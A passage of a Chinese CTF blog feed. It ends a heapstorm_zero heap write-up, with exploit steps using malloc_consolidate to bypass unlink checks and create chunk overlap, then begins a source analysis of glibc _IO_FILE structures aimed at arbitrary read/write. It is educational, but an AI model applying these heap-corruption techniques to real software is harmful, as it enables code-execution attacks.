(av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="function"><span class="title">remainder</span>-&gt;</span>fd_nextsize = NULL;</span><br><span class="line">                  <span class="function"><span class="title">remainder</span>-&gt;</span>bk_nextsize = NULL;</span><br><span class="line">                &#125;</span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><h5 id="利用malloc-consolidate设置prev-size绕过unlink检查"><a href="#利用malloc-consolidate设置prev-size绕过unlink检查" class="headerlink" title="利用malloc_consolidate设置prev_size绕过unlink检查."></a>利用malloc_consolidate设置prev_size绕过unlink检查.</h5><p>由于属于fastbin的chunk在free的时候不会进行前后的合并操作，所以要构成NULL_byte_poison的效果就需要借助malloc_consolidate.利用他的前向合并操作.<br>但是合并的时候会进行unlink，需要一个小trick:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x28,<span class="string">'\x00'</span>*<span class="number">0</span>x28)</span></span>#<span class="number">1</span>, <span class="number">0</span>x40, offbyNULL, unsorted chunksize <span class="number">0</span>x140 ==&gt; <span class="number">0</span>x100 </span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">2</span> <span class="number">0</span>x70</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">3</span> <span class="number">0</span>xb0</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">4</span> <span class="number">0</span>xf0</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x18,<span class="string">'\n'</span>)</span></span>#<span class="number">5</span> <span class="number">0</span>x130</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x18,<span class="string">'\n'</span>)</span></span>#<span class="number">11</span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">6</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><p>注意delete的顺序:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">6</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><p>先delete的chunk6，再delete的chunk2，顺序不能颠倒，此时fastbin的情况如下：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastbins</span>:</span><br><span class="line"><span class="number">0</span><span class="attribute">x20</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x30</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x40</span>: <span class="number">0</span>x555555757070 —▸ <span class="number">0</span>x555555757180 ◂— <span class="number">0</span>x0（chunk2 -&gt; chunk6）</span><br><span class="line"><span class="number">0</span><span class="attribute">x50</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x60</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x70</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x80</span>: <span class="number">0</span>x0</span><br></pre></td></tr></table></figure></p><p>fastbin头指向的是chunk2，那么malloc_consolidate就会先处理chunk2，先将chunk2移入到unsored bin中，同时设置好prev_size，然后再处理chunk6，chunk6的prev_size还是0x140,就会向前合并，合并成一个大chunk，这样就造成了chunk_overlap。因为将chunk2放入unsored bin中了，且设置好了prev_size，这样unlink的时候就不会报错了。</p><h5 id="申请chunk的时候设置好size。"><a href="#申请chunk的时候设置好size。" class="headerlink" title="申请chunk的时候设置好size。"></a>申请chunk的时候设置好size。</h5><p>因为题中申请内存的时候使用的是calloc，申请到chunk后就会将chunk的内容给清0，这样chunk overlap的时候就会将重叠的chunk的chunk_head给清零了，所以申请到chunk后，注意将chunk_head给还原了。不然free的时候会报错。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x28,p64(<span class="number">0</span>x41)</span></span>*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure></p><p>申请这个chunk的时候会把chunk4的size位给清0，所以要恢复size位，为后面的free chunk4做准备。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上即是我碰到的一些问题，主要就是malloc_consolidate的时候会进行unlink操作，而unlink操作会检查将要unlink的chunk的下一个chunk的prev_size位，需要精确安排来绕过。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;最近跟着别人的wp复现了hctf的heapstorm_zero，是一道关于malloc_consolidate的利用。&lt;/p&gt;
&lt;b
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>_IO_FILE部分源码分析及利用</title>
    <link href="http://yoursite.com/2019/04/24/IO-FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/04/24/IO-FILE部分源码分析及利用/</id>
    <published>2019-04-24T03:13:36.000Z</published>
    <updated>2019-05-24T01:37:26.737Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近的题目(最近两年的国赛，HCTF2018)中出现了很多关于_IO_FILE的利用，不是house of orange中的伪造vtable，而是修改_IO_FILE结构体中的一些指针，达到任意读写的能力。<br>鉴于修改指针这方面的资料很少，只好自己读源码分析了。</p><h3 id="部分源码分析"><a href="#部分源码分析" class="headerlink" title="部分源码分析:"></a>部分源码分析:</h3><p>在linux系统中，打开文件的系统调用是open，当使用open函数打开一个文件后，会返回一个整数，这个整数就是文件描述符。<br>每个进程都有一个叫做task_struct的结构体（即PCB，process control block），用来保存进程的一些信息，这个结构体保存了<strong>文件描述符表</strong>指针，来记录该进程打开的文件。而文件描述符就是这个表的索引。<br>当程序启动后，会默认打开三个文件，stdin,stdout,stderr.分别为标准输入，标准输出，标准错误。对应的文件描述符是0,1,2.<br>linux下一切都当做文件对待，显示器，键盘等都当做文件，这里的标准输入对应的就是键盘，标准输出就是对应的显示器。</p><p>而c语言用一个指向_IO_FILE结构体的指针来操作其对应的文件，其中<strong>封装了文件描述符</strong>，这个FILE结构体中保存的有文件描述符，操作文件权限，<strong>_IO_缓冲区信息</strong>等。后面的任意读写漏洞就是出在了IO缓冲区这里。<br>当使用fopen函数打开一个文件后，会返回一个指向FILE结构体的指针。<br>如:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">fp</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">fp</span>=fopen(<span class="string">"xxx"</span>,<span class="string">"r"</span>)</span><br></pre></td></tr></table></figure></p><h4 id="IO-FILE结构体："><a href="#IO-FILE结构体：" class="headerlink" title="_IO_FILE结构体："></a>_IO_FILE结构体：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">truct <span class="variable">_IO_FILE</span> &#123;</span><br><span class="line">  int <span class="variable">_flags</span>;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_ptr</span>;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  char* <span class="variable">_IO_read_end</span>;<span class="comment">/* End of get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_base</span>;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_base</span>;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_ptr</span>;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_end</span>;<span class="comment">/* End of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_base</span>;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_end</span>;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  char *<span class="variable">_IO_save_base</span>; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  char *<span class="variable">_IO_backup_base</span>;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  char *<span class="variable">_IO_save_end</span>; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  struct <span class="variable">_IO_marker</span> *<span class="variable">_markers</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_chain</span>;</span><br><span class="line">  int <span class="variable">_fileno</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  int <span class="variable">_blksize</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  int <span class="variable">_flags2</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="variable">_IO_off_t</span> <span class="variable">_old_offset</span>; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  unsigned short <span class="variable">_cur_column</span>;</span><br><span class="line">  signed char <span class="variable">_vtable_offset</span>;</span><br><span class="line">  char <span class="variable">_shortbuf</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_lock_t</span> *<span class="variable">_lock</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct <span class="variable">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> <span class="variable">_file</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  <span class="variable">_IO_off64_t</span> <span class="variable">_offset</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  struct <span class="variable">_IO_codecvt</span> *<span class="variable">_codecvt</span>;</span><br><span class="line">  struct <span class="variable">_IO_wide_data</span> *<span class="variable">_wide_data</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_freeres_list</span>;</span><br><span class="line">  void *<span class="variable">_freeres_buf</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  void *<span class="variable">__pad1</span>;</span><br><span class="line">  void *<span class="variable">__pad2</span>;</span><br><span class="line">  void *<span class="variable">__pad3</span>;</span><br><span class="line">  void *<span class="variable">__pad4</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  size_t <span class="variable">__pad5</span>;</span><br><span class="line">  int <span class="variable">_mode</span>;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  char <span class="variable">_unused2</span>[<span class="number">15</span> * <span class="built_in">sizeof</span> (int) - <span class="number">4</span> * <span class="built_in">sizeof</span> (void *) - <span class="built_in">sizeof</span> (size_t)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>FILE结构体中有很多指针，<strong>这里重点关注一下这些指针</strong>:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">char</span>* _IO_read_ptr;/* Current read pointer */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_end;/* <span class="keyword">End</span> <span class="keyword">of</span> <span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_base;/* Start <span class="keyword">of</span> putback+<span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_base;/* Start <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_end;/* <span class="keyword">End</span> <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_base;/* Start <span class="keyword">of</span> reserve area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_end;/* <span class="keyword">End</span> <span class="keyword">of</span> reserve area. */</span><br></pre></td></tr></table></figure></p><p>这些指针记录了IO缓冲区的位置，和当前的读写位置。<br>c语言为了提高效率，为IO提供了缓冲区（这些缓冲区是默认分配在堆中的，也可以使用setbuf，setvbuf函数将输入输出与特定的缓存区相联系），<strong>当第一次对文件读的时候，会以页为单位，将文件中的内容读取到缓冲区中，以供程序后来的使用，避免了多次系统调用，降低了效率(用户态和内核态的切换的消耗很大)。同理，对文件进行写操作的时候，其实是先在缓冲区中写</strong>。如果修改这些指针，则可以达到任意读写的能力，但是需要搞清楚glibc是如何使用这些指针的。</p><p><strong>注意使用缓冲区的情况是使用c标准库的文件操作函数，如果你使用系统调用write，read等函数，是不使用缓冲区的，他直接将内容写入到对应的文件中（或直接从对应的文件中读取），因为write，read函数是直接使用文件描述符的，并不使用FILE结构。</strong></p><p>pwn的题目通常都会setbuf，setvbuf，取消缓冲区，防止缓冲区没有满，没有输出的情况。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br></pre></td></tr></table></figure><p>这个指针指向下个FILE结构，所有的FILE结构体是使用单向链表串起来的，链表头是_IO_list_all.<br>如图所示：<br><img src="https://github.com/Dittozzz/CTF-pwn-writeup/blob/master/_IO_FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png?raw=true" alt=""></p><h4 id="IO-FILE-plus结构体："><a href="#IO-FILE-plus结构体：" class="headerlink" title="_IO_FILE_plus结构体："></a>_IO_FILE_plus结构体：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plus结构体只是对_IO_FILE结构体进行了封装，增加了一个新成员：vtable，这个和c++里的vtable很像。其实fopen返回的是_IO_FILE_plus类型的指针。<br>vtable是指向_IO_jump_t结构体类型的指针，_IO_jumpt_t结构体的定义如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy2)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_finish_t, </span>__finish)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_overflow_t, </span>__overflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__underflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__uflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_pbackfail_t, </span>__pbackfail)<span class="comment">;</span></span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsputn_t, </span>__xsputn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsgetn_t, </span>__xsgetn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekoff_t, </span>__seekoff)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekpos_t, </span>__seekpos)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_setbuf_t, </span>__setbuf)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_sync_t, </span>__sync)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_doallocate_t, </span>__doallocate)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_read_t, </span>__read)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_write_t, </span>__write)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seek_t, </span>__seek)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_close_t, </span>__close)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_stat_t, </span>__stat)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_showmanyc_t, </span>__showmanyc)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_imbue_t, </span>__imbue)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>其中<code>JUMP_FIELD</code>是一个宏：<code>#define JUMP_FIELD(TYPE, NAME) TYPE NAME</code></p><p>可以看出 _IO_jump_t 是一个函数指针表，里面存的是函数指针，用来以后的跳转。libc中的函数指针非常多，可以劫持libc中的函数指针来劫持程序的执行流。<br>house of orange 就是构造 fake vtable 来getshell的，这里只是提下这个技术，本篇重点不在这里，而是修改指向缓冲区的指针。<br>这个函数表中有两个很重要的函数：<strong>overflow，</strong>underflow，在后面分析实例函数的时候会提到。</p><h4 id="fopen函数"><a href="#fopen函数" class="headerlink" title="fopen函数:"></a>fopen函数:</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *<span class="keyword">new</span><span class="type">_f</span> = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span><span class="type">_f</span> == NULL) <span class="comment">//分配失败</span></span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file._lock = &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, NULL, NULL);</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  _IO_JUMPS (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new<span class="type">_file_init_internal</span> (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.vtable = NULL;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) <span class="keyword">new</span><span class="type">_f</span>, filename, mode, is32) != NULL)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line">  free (<span class="keyword">new</span><span class="type">_f</span>);</span><br><span class="line">  <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_no_init函数是用来初始化的，他调用了<code>_IO_old_init</code><br>其定义如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_old_init (_IO_FILE *fp, int flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags = _IO_MAGIC|flags;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_chain = NULL; <span class="comment">/* Not necessary. */</span></span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_backup_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_markers = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_cur_column = <span class="number">0</span>;</span><br><span class="line">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_vtable_offset = <span class="number">0</span>;</span><br><span class="line">#endif</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_lock != NULL)</span><br><span class="line">    _IO_<span class="function"><span class="title">lock_init</span> (*fp-&gt;</span>_lock);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将缓冲区指针初始化为NULL，还有一些其他初始化的操作。<br><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code><br><code>#define 